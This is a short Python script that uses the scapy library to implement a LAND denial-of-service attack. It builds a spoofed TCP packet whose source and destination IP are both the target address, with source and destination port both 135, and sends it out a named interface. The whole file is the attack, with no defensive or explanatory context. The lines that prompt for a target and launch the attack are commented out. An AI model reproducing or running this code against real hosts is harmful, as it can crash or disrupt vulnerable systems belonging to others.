from scapy.all import *

def land_dos(dst_ip):
    pkt = IP(src=dst_ip,dst=dst_ip)/TCP(sport=135,dport=135)
    sr1(pkt,iface="eth1")


#dst_ip = raw_input("dst_ip:")
#land_dos(dst_ip)


